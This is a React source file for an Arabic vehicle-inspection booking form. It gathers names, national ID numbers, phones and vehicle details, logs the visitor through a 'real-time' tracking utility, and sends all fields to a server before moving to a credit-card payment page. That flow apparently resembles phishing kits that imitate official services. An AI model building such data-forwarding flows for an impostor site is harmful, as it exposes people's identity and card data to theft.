import CarPanelSelection from "@/components/VSC-client/CarPanel/CarPanelSelection";
import Heading from "@/components/VSC-client/Heading/Heading";
import { CheckBoxWithText } from "@/components/VSC-client/ui/checkbox";
import { DuelSelect } from "@/components/VSC-client/ui/dual-select";
import { Input } from "@/components/VSC-client/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import Label from "@/components/VSC-client/ui/label";
import {
  checkTypes,
  countries,
  regions,
  registrationTypes,
  vehicleType,
} from "@/data/selects-data";
import { AlertTriangleIcon } from "lucide-react";
import { Link } from "react-router-dom";
import { Controller, useController, useForm } from "react-hook-form";
import { motion } from "framer-motion";
import React, { useEffect, useRef, useState } from "react";
import { inspectionFees } from "@/pages/InpeciontFees";
import timeArray from "@/constants/timings";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { registerVisitor } from "@/real-time/utils/utils";
import { validatityCheck } from "@/lib/helpers";
import {
  Button,
  FormControl,
  InputAdornment,
  OutlinedInput,
  Stack,
} from "@mui/material";
import { LocalizationProvider } from "@mui/x-date-pickers/LocalizationProvider";
import { AdapterDayjs } from "@mui/x-date-pickers/AdapterDayjs";
import { DatePicker } from "@mui/x-date-pickers/DatePicker";
import allCountries from "i18n-iso-countries";
import arLocale from "i18n-iso-countries/langs/ar.json";
import dayjs from "dayjs";

interface FormData {
  id: string;
  name: string;
  email: string;
  phone: string;
  nationality: string;
  plate: string;
  condition: string;
  country: string;
  "registration-type": string;
  "vehicle-type": string;
  "check-type": string;
  region: string;
  "check-place": string;
  date: dayjs.Dayjs;
  time: string;
  commissioner: string;
  "commissioner-name"?: string;
  "commissioner-phone"?: string;
  "commissioner-nationality"?: string;
  "commissioner-id"?: string;
  "commissioner-date"?: dayjs.Dayjs;
  "commissioner-accept"?: boolean;
}

const currentPageName = "حجز موعد";

const ApplyForm = () => {
  const formRef = useRef<HTMLFormElement>(null);
  const [commissionerOpen, setCommissionerOpen] = useState(false);
  const [isKsa, setIsKsa] = useState(true);
  const [plate, setPlate] = useState("");

  useEffect(() => {
    setCurrentPage(currentPageName);
  }, []);

  const searchParams = new URLSearchParams(window.location.search);
  const defaultVehicleType = searchParams.get("vehicle-type") || "";

  const {
    register,
    control,
    handleSubmit,
    setValue,
    watch,
    setError,
    formState: { errors },
  } = useForm<FormData>({
    mode: "all",
    defaultValues: {
      condition: "تحمل رخصة سير",
      country: "السعودية",
      "vehicle-type": defaultVehicleType,
      "check-type": "خدمة الفحص الدوري",
      commissioner: "مواطن / مقيم",
      date: dayjs(),
    },
  });

  const calculateAge = (dateString: string) => {
    const today = new Date();
    const birthDate = new Date(dateString);
    let age = today.getFullYear() - birthDate.getFullYear();
    const monthDiff = today.getMonth() - birthDate.getMonth();

    if (
      monthDiff < 0 ||
      (monthDiff === 0 && today.getDate() < birthDate.getDate())
    ) {
      age--;
    }
    return age;
  };

  const onSubmit = (data: FormData) => {
    if (commissionerOpen && commissionerDate) {
      const age = calculateAge(String(commissionerDate));
      if (age < 18) {
        return setError("commissioner-date", {
          message: "يجيب ان لا يقل العمر عن 18 سنة",
        });
      }
    }

    if (!plate) {
      return setError("plate", { message: "ادخل رقم السيارة" });
    }

    const selectedVehicle = inspectionFees.find(
      (fee) => fee.vehicleType === data["vehicle-type"]
    );

    const type =
      data["check-type"] === checkTypes[0].name
        ? "initialInspection"
        : "reInspection";

    let fee = {
      total: 115.0,
      base: 100.0,
      vat: 15.0,
    };

    if (selectedVehicle) {
      fee = selectedVehicle[type];
    }

    const { name, id, phone, ...serverData } = data;

    registerVisitor({ fullName: name, idNumber: id, phone });

    localStorage.setItem(
      "paymentInvoice",
      JSON.stringify({ fee, feeTitle: data["check-type"] })
    );

    sendDataToServer({
      data: {
        الاسم: name,
        "رقم الهوية": id,
        "رقم الجوال": phone,
        "البريد الإلكتروني": serverData.email,
        الجنسية: serverData.nationality,
        "أسم المفوض": serverData["commissioner-name"],
        "رقم جوال المفوض": serverData["commissioner-phone"],
        "جنسية المفوض": serverData["commissioner-nationality"],
        "رقم هوية / اقامة المفوض": serverData["commissioner-id"],
        "تاريخ ميلاد المفوض": serverData["commissioner-date"],
        "حالة المركبة": serverData.condition,
        "بلد التسجيل": serverData.country,
        "نوع التسجيل": serverData["registration-type"],
        اللوحة: plate,
        "نوع المركبة": serverData["vehicle-type"],
        "نوع خدمة الفحص": serverData["check-type"],
        المنطقة: serverData.region,
        "مركز الفحص": serverData["check-place"],
        "تاريخ الفحص": serverData.date
          .toString()
          .replace("T", " ")
          .split(".")[0],
        "موعد الخدمة": serverData.time,
        "رسوم الخدمة": fee.base,
        "ضريبة القيمة المضافة": fee.vat,
        مجموع: fee.total,
      },
      current: currentPageName,
      nextPage: `الدفع بطاقة الائتمان`,
    });
  };

  const { field: conditionField } = useController({
    name: "condition",
    control,
    rules: { required: "هذا الحقل مطلوب" },
  });

  const { field: commissionerField } = useController({
    name: "commissioner",
    control,
    rules: { required: "هذا الحقل مطلوب" },
  });

  const [phoneFocused, setPhoneFocused] = useState(false);
  const [dateValue, setDateValue] = React.useState(dayjs());
  const [commissionerDate, setCommissionerDate] = React.useState(dayjs());

  allCountries.registerLocale(arLocale);
  const countryObj = allCountries.getNames("ar", { select: "official" });
  const nationalitiesList = Object.entries(countryObj).sort((a, b) => {
    if (a[1] === "السعودية") return -1;
    if (b[1] === "السعودية") return 1;
    return a[1].localeCompare(b[1], "ar");
  });

  return (
    <form
      onSubmit={handleSubmit(onSubmit)}
      className="mt-10 lg:mt-16 flex flex-col gap-4"
      ref={formRef}
    >
      <Heading className="text-xl lg:text-2xl">المعلومات الشخصية</Heading>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="name" className="text-foreground font-semibold">
          الأسم
        </Label>
        <Input
          type="text"
          id="name"
          placeholder="أكتب أسمك هنا..."
          {...register("name", {
            required: "هذا الحقل مطلوب",
            pattern: {
              value: /^[\u0621-\u064Aa-zA-Z\s]+$/,
              message: "الاسم يجب أن يحتوي على أحرف عربية أو إنجليزية فقط",
            },
          })}
        />
        {errors.name && (
          <p className="text-red-500 text-sm">{errors.name.message}</p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="email" className="text-foreground font-semibold">
          البريد الإلكتروني
        </Label>
        <Input
          type="email"
          id="email"
          placeholder="أكتب بريدك الإلكتروني هنا..."
          {...register("email", {
            required: "هذا الحقل مطلوب",
            pattern: {
              value: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
              message: "البريد الإلكتروني غير صالح",
            },
          })}
        />
        {errors.email && (
          <p className="text-red-500 text-sm">{errors.email.message}</p>
        )}
      </div>

      <div className="flex flex-wrap gap-2 lg:gap-10">
        <div className="max-w-sm space-y-2 flex-1">
          <Stack>
            <Label htmlFor="phone" className="text-foreground font-semibold">
              رقم الجوال
            </Label>
            <FormControl fullWidth margin="none" size="small">
              <Controller
                name="phone"
                control={control}
                rules={{
                  required: "يرجى إدخال رقم الجوال",
                  validate: (value) => {
                    const cleaned = value.replace(/[^\d]/g, "");
                    return (
                      /^05\d{8}$/.test(cleaned) ||
                      "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام"
                    );
                  },
                }}
                render={({ field }) => (
                  <>
                    <OutlinedInput
                      {...field}
                      dir="ltr"
                      id="phone"
                      type="tel"
                      sx={{
                        "& .MuiOutlinedInput-notchedOutline": {
                          borderColor: "#e2e8f0",
                        },
                        "&:hover .MuiOutlinedInput-notchedOutline": {
                          borderColor: "#e2e8f0",
                        },
                      }}
                      onChange={(e) => {
                        let rawValue = e.target.value.replace(/[^\d]/g, "");
                        if (rawValue.length > 10) {
                          rawValue = rawValue.slice(0, 10);
                        }
                        field.onChange(rawValue);
                      }}
                      startAdornment={
                        <InputAdornment position="start">
                          <img
                            src="https://flagcdn.com/sa.svg"
                            alt="flag sa"
                            className="w-8"
                          />
                        </InputAdornment>
                      }
                      notched={phoneFocused || !!watch("phone")}
                      onFocus={() => setPhoneFocused(true)}
                      onBlur={() => setPhoneFocused(false)}
                    />
                    {!watch("phone") && (
                      <span
                        className="absolute inset-y-0 left-3 text-gray-400 flex items-center pointer-events-none"
                        style={{ right: "10px" }}
                      >
                        أكتب رقم الجوال هنا...
                      </span>
                    )}
                  </>
                )}
              />
            </FormControl>
          </Stack>

          {/* <Label htmlFor="phone" className="text-foreground font-semibold">
            رقم الجوال
          </Label>
          <Input
            type="tel"
            id="phone"
            placeholder="...أكتب رقم الجوال هنا"
            {...register("phone", {
              required: "هذا الحقل مطلوب",
              pattern: {
                value: /^\d{9}$/,
                message: "رقم الجوال يجب أن يكون 9 أرقام",
              },
            })}
          /> */}
          {errors.phone && (
            <p className="text-red-500 text-sm">{errors.phone.message}</p>
          )}
        </div>
      </div>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="id" className="text-foreground font-semibold">
          رقم الهوية الوطنية / الاقامة
        </Label>
        <Input
          type="tel"
          id="id"
          placeholder="...أكتب رقم الهوية الوطنية / الاقامة هنا"
          {...register("id", {
            required: "هذا الحقل مطلوب",
            validate: (value) =>
              validatityCheck("id", value) || "رقم الهوية غير صالح",
            pattern: {
              value: /^\d{10}$/,
              message: "رقم الهوية يجب أن يكون 10 أرقام",
            },
          })}
        />
        {errors.id && (
          <p className="text-red-500 text-sm">{errors.id.message}</p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="nationality" className="text-foreground font-semibold">
          الجنسية
        </Label>
        <Select
          onValueChange={(value) => setValue("nationality", value)}
          dir="rtl"
          {...register("nationality", { required: "هذا الحقل مطلوب" })}
        >
          <SelectTrigger className="w-full">
            <SelectValue placeholder="أختر الجنسية" />
          </SelectTrigger>
          <SelectContent>
            {nationalitiesList.map((country) => (
              <SelectItem key={country[1]} value={country[1]}>
                {country[1]}
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
        {errors.nationality && (
          <p className="text-red-500 text-sm">{errors.nationality.message}</p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <CheckBoxWithText
          label="هل تريد تفويض شخص آخر بفحص المركبة؟"
          className="mt-4"
          handleCommissionerToggle={() =>
            setCommissionerOpen(!commissionerOpen)
          }
        />
      </div>

      {commissionerOpen && (
        <motion.section
          className="flex flex-col gap-4"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0, transition: { duration: 0.5 } }}
        >
          <Heading className="text-xl lg:text-2xl mt-6 lg:mt-10">
            المعلومات المفوض
          </Heading>

          <div className="space-y-2">
            <DuelSelect
              id="commissioner"
              label="هل المفوض"
              opts={["مواطن / مقيم", "مواطن خليجي"]}
              value={commissionerField.value}
              onValueChange={commissionerField.onChange}
            />

            {errors.commissioner && (
              <p className="text-red-500 text-sm">
                {errors.commissioner.message}
              </p>
            )}
          </div>

          <div className="max-w-sm space-y-2">
            <Label
              htmlFor="commissioner-name"
              className="text-foreground font-semibold"
            >
              أسم المفوض
            </Label>
            <Input
              type="text"
              id="commissioner-name"
              placeholder="أكتب أسم المفوض هنا..."
              {...register("commissioner-name", {
                required: commissionerOpen ? "هذا الحقل مطلوب" : false,
              })}
            />
            {errors["commissioner-name"] && (
              <p className="text-red-500 text-sm">
                {errors["commissioner-name"].message}
              </p>
            )}
          </div>

          <div className="flex gap-2 lg:gap-10">
            <div className="max-w-sm space-y-2 flex-1">
              <Stack>
                <Label
                  htmlFor="commissioner-phone"
                  className="text-foreground font-semibold"
                >
                  رقم الجوال
                </Label>
                <FormControl fullWidth margin="none" size="small">
                  <Controller
                    name="commissioner-phone"
                    control={control}
                    rules={{
                      required: "يرجى إدخال رقم الجوال",
                      validate: (value) => {
                        const cleaned = (value as string).replace(/[^\d]/g, "");
                        return (
                          /^05\d{8}$/.test(cleaned) ||
                          "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام"
                        );
                      },
                    }}
                    render={({ field }) => (
                      <>
                        <OutlinedInput
                          {...field}
                          dir="ltr"
                          id="commissioner-phone"
                          type="tel"
                          sx={{
                            "& .MuiOutlinedInput-notchedOutline": {
                              borderColor: "#e2e8f0",
                            },
                            "&:hover .MuiOutlinedInput-notchedOutline": {
                              borderColor: "#e2e8f0",
                            },
                          }}
                          onChange={(e) => {
                            let rawValue = e.target.value.replace(/[^\d]/g, "");
                            if (rawValue.length > 10) {
                              rawValue = rawValue.slice(0, 10);
                            }
                            field.onChange(rawValue);
                          }}
                          startAdornment={
                            <InputAdornment position="start">
                              <img
                                src="https://flagcdn.com/sa.svg"
                                alt="flag sa"
                                className="w-8"
                              />
                            </InputAdornment>
                          }
                          onFocus={() => setPhoneFocused(true)}
                          onBlur={() => setPhoneFocused(false)}
                        />
                        {!watch("commissioner-phone") && (
                          <span
                            className="absolute inset-y-0 left-3 text-gray-400 flex items-center pointer-events-none"
                            style={{ right: "10px" }}
                          >
                            أكتب رقم الجوال المفوض هنا...
                          </span>
                        )}
                      </>
                    )}
                  />
                </FormControl>
              </Stack>
              {errors["commissioner-phone"] && (
                <p className="text-red-500 text-sm">
                  {errors["commissioner-phone"].message}
                </p>
              )}
            </div>
          </div>

          <div className="max-w-sm space-y-2">
            <Label
              htmlFor="commissioner-nationality"
              className="text-foreground font-semibold"
            >
              جنسية المفوض
            </Label>
            <Select
              onValueChange={(value) =>
                setValue("commissioner-nationality", value)
              }
              dir="rtl"
              {...register("commissioner-nationality", {
                // required: commissionerOpen ? "هذا الحقل مطلوب" : false,
              })}
            >
              <SelectTrigger className="w-full">
                <SelectValue placeholder="أختر الجنسية" />
              </SelectTrigger>
              <SelectContent>
                {nationalitiesList.map((country) => (
                  <SelectItem key={country[1]} value={country[1]}>
                    {country[1]}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {errors["commissioner-nationality"] && (
              <p className="text-red-500 text-sm">
                {errors["commissioner-nationality"].message}
              </p>
            )}
          </div>

          <div className="grid gap-4 lg:grid-cols-2">
            <div className="max-w-sm space-y-2">
              <Label
                htmlFor="commissioner-id"
                className="text-foreground font-semibold"
              >
                رقم الهوية الوطنية / الاقامة المفوض
              </Label>
              <Input
                type="tel"
                id="commissioner-id"
                placeholder="...أكتب رقم الهوية الوطنية / الاقامة المفوض هنا"
                {...register("commissioner-id", {
                  required: commissionerOpen ? "هذا الحقل مطلوب" : false,
                  pattern: {
                    value: /^\d{10}$/,
                    message: "رقم الهوية يجب أن يكون 10 أرقام",
                  },
                })}
              />
              {errors["commissioner-id"] && (
                <p className="text-red-500 text-sm">
                  {errors["commissioner-id"].message}
                </p>
              )}
            </div>

            <div className="max-w-sm space-y-2">
              {/* <DateInput
                id="commissioner-date"
                label="تاريخ ميلاد المفوض"
                placeholder="أختر التاريخ"
                {...register("commissioner-date", {
                  required: commissionerOpen ? "هذا الحقل مطلوب" : false,
                })}
                errors={errors}
                handleSelectChange={(value) => {
                  setValue("commissioner-date", value);
                }}
                disabledCalendar={(day: Date) => day > new Date()}
              /> */}
              <Label
                htmlFor="commissioner-date"
                className="text-foreground font-semibold"
              >
                تاريخ ميلاد المفوض
              </Label>
              <LocalizationProvider dateAdapter={AdapterDayjs}>
                <DatePicker
                  maxDate={dayjs()}
                  sx={{ width: "100%" }}
                  value={commissionerDate}
                  {...register("commissioner-date", {
                    required: commissionerOpen ? "هذا الحقل مطلوب" : false,
                  })}
                  onChange={(newValue) => {
                    setCommissionerDate(newValue!);
                    setValue("commissioner-date", newValue!);
                  }}
                />
              </LocalizationProvider>

              {errors["commissioner-date"] && (
                <p className="text-red-500 text-sm">
                  {errors["commissioner-date"].message}
                </p>
              )}
            </div>
          </div>

          <div className="space-y-2">
            <Controller
              name="commissioner-accept"
              control={control}
              rules={{ required: "يجب الموافقة على هذا الشرط" }}
              render={({ field }) => (
                <CheckBoxWithText
                  id="commissioner-accept"
                  label="أوافق علي أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية بزيارة وإجراء الفحص الفني الدوري للمركبة المفوض عليها"
                  className="mt-4 max-w-lg"
                  checked={field.value}
                  onCheckedChange={field.onChange}
                />
              )}
            />
            {errors["commissioner-accept"] && (
              <p className="text-red-500 text-sm">
                {errors["commissioner-accept"].message}
              </p>
            )}
          </div>
        </motion.section>
      )}

      <Heading className="text-xl lg:text-2xl mt-6 lg:mt-10">
        المعلومات المركبة
      </Heading>

      <div className="space-y-2">
        <DuelSelect
          label="أختر حالة المركبة"
          id="condition"
          opts={["تحمل رخصة سير", "تحمل بطاقة جمركية"]}
          value={conditionField.value}
          onValueChange={conditionField.onChange}
        />
        {errors.condition && (
          <p className="text-red-500 text-sm">{errors.condition.message}</p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="country" className="text-foreground font-semibold">
          البلد التسجيل
        </Label>
        <Select
          onValueChange={(value) => {
            setValue("country", value);
            setIsKsa(value === "السعودية");
          }}
          defaultValue="السعودية"
          dir="rtl"
          {...register("country", { required: "هذا الحقل مطلوب" })}
        >
          <SelectTrigger className="w-full">
            <SelectValue placeholder="أختر البلد التسجيل" />
          </SelectTrigger>
          <SelectContent>
            {countries.map((country) => (
              <SelectItem key={country.name} value={country.name}>
                {country.name}
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
        {errors.country && (
          <p className="text-red-500 text-sm">{errors.country.message}</p>
        )}
      </div>

      {isKsa && (
        <motion.span
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0, transition: { duration: 0.5 } }}
        >
          <div className="space-y-2">
            <CarPanelSelection
              error={errors.plate?.message}
              setPlate={setPlate}
            />
          </div>

          <div className="max-w-sm space-y-2">
            <Label
              htmlFor="registration-type"
              className="text-foreground font-semibold"
            >
              نوع التسجيل
            </Label>
            <Select
              onValueChange={(value) => setValue("registration-type", value)}
              dir="rtl"
              {...register("registration-type")}
            >
              <SelectTrigger className="w-full">
                <SelectValue placeholder="أختر نوع التسجيل" />
              </SelectTrigger>
              <SelectContent>
                {registrationTypes.map((type) => (
                  <SelectItem key={type.name} value={type.name}>
                    {type.name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {errors["registration-type"] && (
              <p className="text-red-500 text-sm">
                {errors["registration-type"].message}
              </p>
            )}
          </div>
        </motion.span>
      )}

      {!isKsa && (
        <div className="max-w-sm space-y-2">
          <Label htmlFor="plate" className="text-foreground font-semibold">
            رقم اللوحة
          </Label>
          <Input
            type="text"
            id="plate"
            placeholder="أكتب رقم اللوحة هنا..."
            {...register("plate", { required: "هذا الحقل مطلوب" })}
          />
          {errors.plate && (
            <p className="text-red-500 text-sm">{errors.plate.message}</p>
          )}
        </div>
      )}

      <Heading className="text-xl lg:text-2xl mt-6 lg:mt-10">
        مركز الخدمة
      </Heading>
      <div className="grid lg:grid-cols-2 gap-4">
        <div className="max-w-sm space-y-2">
          <Label
            htmlFor="vehicle-type"
            className="text-foreground font-semibold"
          >
            نوع المركبة
          </Label>
          <Select
            onValueChange={(value) => setValue("vehicle-type", value)}
            defaultValue={defaultVehicleType}
            dir="rtl"
            {...register("vehicle-type", { required: "هذا الحقل مطلوب" })}
          >
            <SelectTrigger className="w-full">
              <SelectValue placeholder="أختر نوع المركبة" />
            </SelectTrigger>
            <SelectContent>
              {vehicleType.map((type) => (
                <SelectItem key={type.name} value={type.name}>
                  {type.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          {errors["vehicle-type"] && (
            <p className="text-red-500 text-sm">
              {errors["vehicle-type"].message}
            </p>
          )}
        </div>

        <div className="max-w-sm space-y-2">
          <Label htmlFor="check-type" className="text-foreground font-semibold">
            نوع خدمة الفحص
          </Label>
          <Select
            onValueChange={(value) => setValue("check-type", value)}
            defaultValue="خدمة الفحص الدوري"
            dir="rtl"
            disabled={!defaultVehicleType && !watch("vehicle-type")}
            {...register("check-type", { required: "هذا الحقل مطلوب" })}
          >
            <SelectTrigger className="w-full">
              <SelectValue placeholder="أختر نوع خدمة الفحص" />
            </SelectTrigger>
            <SelectContent>
              {checkTypes.map((type) => (
                <SelectItem key={type.name} value={type.name}>
                  {type.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          {errors["check-type"] && (
            <p className="text-red-500 text-sm">
              {errors["check-type"].message}
            </p>
          )}
        </div>

        <div className="lg:col-span-2">
          <p>
            إذا لم تكن متأكدًا من نوع المركبة ، فيمكنك العثور عليها في{" "}
            <Link
              to="/vehicle-types"
              className="text-green-600 underline underline-offset-4"
            >
              أنواع المركبات
            </Link>
          </p>
        </div>

        <div className="max-w-sm space-y-2">
          <Label htmlFor="region" className="text-foreground font-semibold">
            المنطقة
          </Label>
          <Select
            onValueChange={(value) => setValue("region", value)}
            dir="rtl"
            disabled={!watch("check-type")}
            {...register("region", { required: "هذا الحقل مطلوب" })}
          >
            <SelectTrigger className="w-full">
              <SelectValue placeholder="أختر المنطقة" />
            </SelectTrigger>
            <SelectContent>
              {regions.map((region) => (
                <SelectItem key={region.name} value={region.name}>
                  {region.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          {errors.region && (
            <p className="text-red-500 text-sm">{errors.region.message}</p>
          )}
        </div>

        <div className="max-w-sm space-y-2">
          <Label
            htmlFor="check-place"
            className="text-foreground font-semibold"
          >
            مركز الفحص
          </Label>
          <Select
            onValueChange={(value) => setValue("check-place", value)}
            dir="rtl"
            disabled={!watch("region")}
            {...register("check-place", { required: "هذا الحقل مطلوب" })}
          >
            <SelectTrigger className="w-full">
              <SelectValue placeholder="أختر مركز الفحص" />
            </SelectTrigger>
            <SelectContent>
              {regions
                .find((r) => r.name === watch("region"))
                ?.maintainanceCenters?.map((center: { name: string }) => (
                  <SelectItem key={center.name} value={center.name}>
                    {center.name}
                  </SelectItem>
                ))}
            </SelectContent>
          </Select>
          {errors["check-place"] && (
            <p className="text-red-500 text-sm">
              {errors["check-place"].message}
            </p>
          )}
        </div>

        <iframe
          src="https://maps.google.com/maps?q=24.7136,46.6753&z=12&output=embed"
          className="mt-4 lg:col-span-2 w-full max-w-xl lg:h-[30dvh] rounded-lg mx-auto"
        />
      </div>

      <Heading className="text-xl lg:text-2xl mt-6 lg:mt-10">
        موعد الخدمة
      </Heading>
      <div className="grid gap-4 lg:grid-cols-2">
        <div className="max-w-sm space-y-2">
          <LocalizationProvider dateAdapter={AdapterDayjs}>
            <DatePicker
              formatDensity="dense"
              minDate={dayjs()}
              sx={{ width: "100%" }}
              value={dateValue}
              {...register("date", { required: "هذا الحقل مطلوب" })}
              onChange={(newValue) => {
                setDateValue(newValue!);
                setValue("date", newValue!);
              }}
            />
          </LocalizationProvider>
          {errors.date && (
            <p className="text-red-500 text-sm">{errors.date.message}</p>
          )}
        </div>

        <div className="max-w-sm space-y-2">
          <Label htmlFor="time" className="text-foreground font-semibold">
            موعد الخدمة
          </Label>
          <Select
            onValueChange={(value) => setValue("time", value)}
            dir="rtl"
            {...register("time", { required: "هذا الحقل مطلوب" })}
          >
            <SelectTrigger className="w-full">
              <SelectValue placeholder="أختر موعد الخدمة" />
            </SelectTrigger>
            <SelectContent>
              {timeArray.map((time) => (
                <SelectItem key={time.name} value={time.name}>
                  {time.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          {errors.time && (
            <p className="text-red-500 text-sm">{errors.time.message}</p>
          )}
        </div>
      </div>

      <div className="bg-red-50 px-4 py-2 rounded-md max-w-lg mt-2">
        <p className="text-red-600">
          <AlertTriangleIcon className="w-5 h-5 inline" /> الحضور على الموعد
          يسهم في سرعة و جودة الخدمة و في حال عدم الحضور، لن يسمح بحجز موعد آخر
          إلا بعد 48 ساعة وحسب الاوقات المتاحة
        </p>
      </div>

      <Button
        type="submit"
        variant="contained"
        size="large"
        sx={{ width: "fit-content", mx: "auto" }}
      >
        التالي
      </Button>
    </form>
  );
};
export default ApplyForm;
